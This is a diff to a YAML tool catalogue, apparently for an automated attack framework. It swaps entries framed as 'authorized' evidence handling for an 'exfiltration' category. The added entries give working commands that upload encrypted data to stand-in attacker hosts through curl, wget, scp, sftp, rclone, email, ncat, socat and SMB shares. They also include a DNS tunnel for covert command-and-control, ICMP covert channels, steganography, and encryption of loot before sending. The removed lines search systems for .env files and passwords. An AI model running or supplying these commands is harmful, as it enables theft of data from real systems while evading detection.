@@ -1,81 +1,142 @@
-system_tools:
-  description: "Built-in OS utilities for locating sensitive files"
-  category: "post_exploitation"
-  install_cmd: ""
-  verify_cmd: ""
+curl:
+  description: "HTTP/S data transfer — POST files, chunked uploads, API exfiltration"
+  category: "exfiltration"
+  install_cmd: "apt-get install -y curl"
+  verify_cmd: "curl --version"
   examples:
-    - "find / -type f -name '*.env' 2>/dev/null"
-    - "grep -R \"password\" -n /etc 2>/dev/null"
-    - "tar -czf sample.tar.gz /path/to/sample"
+    - "curl -X POST -H 'Content-Type: application/octet-stream' -d @data.enc https://attacker.com/upload"
+    - "curl -s -X POST -F 'file=@data.enc' https://attacker.com/upload"
+    - "curl -s -o /dev/null -w '%{http_code}' https://attacker.com/healthcheck"
 
-redact_samples:
-  description: "Redact sensitive patterns from evidence samples"
-  category: "reporting"
-  install_cmd: "python3 --version"
-  verify_cmd: "python3 skills/exfiltration/scripts/redact_samples.py --help"
+wget:
+  description: "HTTP/S download and POST file upload utility"
+  category: "exfiltration"
+  install_cmd: "apt-get install -y wget"
+  verify_cmd: "wget --version"
   examples:
-    - "python3 skills/exfiltration/scripts/redact_samples.py --input sample.txt --out evidence.json"
-
-smbclient:
-  description: "SMB client for validating file share access"
-  category: "post_exploitation"
-  install_cmd: "apt-get install -y smbclient"
-  verify_cmd: "smbclient --help"
-  examples:
-    - "smbclient -L //target -U user%pass"
-
-psql:
-  description: "PostgreSQL client for metadata checks"
-  category: "post_exploitation"
-  install_cmd: "apt-get install -y postgresql-client"
-  verify_cmd: "psql --version"
-  examples:
-    - "psql -h target -U user -c '\\l'"
-
-mysql:
-  description: "MySQL client for metadata checks"
-  category: "post_exploitation"
-  install_cmd: "apt-get install -y mysql-client"
-  verify_cmd: "mysql --version"
-  examples:
-    - "mysql -h target -u user -p -e 'SHOW DATABASES;'"
-
-mongosh:
-  description: "MongoDB shell for metadata checks"
-  category: "post_exploitation"
-  install_cmd: "apt-get install -y mongodb-clients"
-  verify_cmd: "mongosh --version"
-  examples:
-    - "mongosh --host target --eval 'db.getMongo().getDBNames()'"
-
-redis-cli:
-  description: "Redis client for metadata checks"
-  category: "post_exploitation"
-  install_cmd: "apt-get install -y redis-tools"
-  verify_cmd: "redis-cli --version"
-  examples:
-    - "redis-cli -h target INFO"
+    - "wget --post-file=data.enc https://attacker.com/upload -O /dev/null"
+    - "wget -q --method=POST --body-file=data.enc https://attacker.com/upload"
 
 scp:
-  description: "Secure copy for authorized evidence transfer"
-  category: "post_exploitation"
+  description: "Secure copy over SSH for direct file transfer"
+  category: "exfiltration"
   install_cmd: "apt-get install -y openssh-client"
-  verify_cmd: "scp -V"
+  verify_cmd: "which scp"
   examples:
-    - "scp sample.txt user@host:/tmp/"
+    - "scp data.enc attacker@ip:/loot/"
+    - "scp -l 1000 data.enc attacker@ip:/loot/"  # bandwidth limit 1000 Kbit/s
 
-rsync:
-  description: "File synchronization for authorized evidence transfer"
-  category: "post_exploitation"
-  install_cmd: "apt-get install -y rsync"
-  verify_cmd: "rsync --version"
+sftp:
+  description: "SSH File Transfer Protocol for interactive or batch transfers"
+  category: "exfiltration"
+  install_cmd: "apt-get install -y openssh-client"
+  verify_cmd: "which sftp"
   examples:
-    - "rsync -avz sample/ user@host:/tmp/sample/"
+    - "echo 'put data.enc' | sftp attacker@ip:/loot/"
+    - "sftp -b batch.txt attacker@ip"
+
+rclone:
+  description: "Cloud storage sync — S3, GDrive, Dropbox, Azure, OneDrive"
+  category: "exfiltration"
+  install_cmd: "curl https://rclone.org/install.sh | bash"
+  verify_cmd: "rclone version"
+  examples:
+    - "rclone copy data.enc gdrive:loot/"
+    - "rclone copy data.enc s3:attacker-bucket/loot/"
+    - "rclone copy data.enc dropbox:loot/"
+
+dnscat2:
+  description: "DNS tunnel for covert command-and-control and data exfiltration"
+  category: "exfiltration"
+  install_cmd: "git clone https://github.com/iagox86/dnscat2.git && cd dnscat2/client && make"
+  verify_cmd: "which dnscat2 || ls dnscat2/client/dnscat"
+  examples:
+    - "dnscat2 --dns 'domain=exfil.attacker.com' --secret=shared_secret"
+    - "./dnscat --dns 'domain=exfil.attacker.com,type=TXT'"
+
+hping3:
+  description: "Packet crafting tool — ICMP exfiltration, TCP/UDP covert channels"
+  category: "exfiltration"
+  install_cmd: "apt-get install -y hping3"
+  verify_cmd: "hping3 --version"
+  examples:
+    - "hping3 --icmp -d 1400 --file data.enc attacker_ip"
+    - "hping3 -S -p 80 -d 500 --file data.enc attacker_ip"
+
+steghide:
+  description: "Steganography tool — embed data in JPEG/BMP/WAV/AU files"
+  category: "exfiltration"
+  install_cmd: "apt-get install -y steghide"
+  verify_cmd: "steghide --help"
+  examples:
+    - "steghide embed -cf cover_image.jpg -ef secret.txt -p passphrase"
+    - "steghide extract -sf stego_image.jpg -p passphrase"
+    - "steghide info stego_image.jpg"
+
+swaks:
+  description: "Swiss Army Knife for SMTP — email-based exfiltration with attachments"
+  category: "exfiltration"
+  install_cmd: "apt-get install -y swaks"
+  verify_cmd: "swaks --version"
+  examples:
+    - "swaks --to attacker@mail.com --from user@target.com --attach data.enc --server smtp.target.com"
+    - "swaks --to attacker@mail.com --body 'exfil' --attach @data.enc --server smtp.target.com --port 587 --tls"
+
+ncat:
+  description: "Nmap netcat — encrypted TCP/UDP transfers, relay, and tunneling"
+  category: "exfiltration"
+  install_cmd: "apt-get install -y ncat"
+  verify_cmd: "ncat --version"
+  examples:
+    - "ncat --ssl attacker_ip 4443 < data.enc"
+    - "ncat -l -p 4443 --ssl > received.enc"
+    - "ncat -u attacker_ip 53 < data.enc"
 
 socat:
-  description: "Bidirectional data transfer tool (authorized only)"
-  category: "post_exploitation"
+  description: "Bidirectional data relay — TLS tunnels, port forwarding, covert channels"
+  category: "exfiltration"
   install_cmd: "apt-get install -y socat"
-  verify_cmd: "socat -h"
+  verify_cmd: "socat -V"
   examples:
-    - "socat -V"
+    - "socat -u FILE:data.enc OPENSSL:attacker_ip:4443,verify=0"
+    - "socat -u FILE:data.enc TCP:attacker_ip:8080"
+    - "socat OPENSSL-LISTEN:4443,cert=server.pem,fork FILE:/tmp/received.enc,create"
+
+xxd:
+  description: "Hex dump utility — encode binary data for DNS/text-based exfiltration"
+  category: "exfiltration"
+  install_cmd: "apt-get install -y xxd"
+  verify_cmd: "xxd -v"
+  examples:
+    - "xxd -p data.enc > data.hex"
+    - "xxd -p -r data.hex > data.enc"
+    - "xxd -p data.enc | fold -w 60"
+
+base64:
+  description: "Base64 encoding — prepare binary data for text-based channels"
+  category: "exfiltration"
+  install_cmd: ""
+  verify_cmd: "base64 --version"
+  examples:
+    - "base64 data.enc > data.b64"
+    - "base64 -d data.b64 > data.enc"
+    - "cat data.enc | base64 -w 0"
+
+openssl:
+  description: "Encryption toolkit — AES-256 encrypt data before exfiltration"
+  category: "exfiltration"
+  install_cmd: "apt-get install -y openssl"
+  verify_cmd: "openssl version"
+  examples:
+    - "openssl enc -aes-256-cbc -salt -pbkdf2 -in data.tar.gz -out data.enc -k passphrase"
+    - "openssl enc -aes-256-cbc -d -pbkdf2 -in data.enc -out data.tar.gz -k passphrase"
+    - "openssl rand -hex 32  # generate encryption key"
+
+smbclient:
+  description: "SMB client — exfiltrate over Windows file shares"
+  category: "exfiltration"
+  install_cmd: "apt-get install -y smbclient"
+  verify_cmd: "smbclient --version"
+  examples:
+    - "smbclient //attacker/share -U user%pass -c 'put data.enc'"
+    - "smbclient //attacker/share -N -c 'put data.enc'"
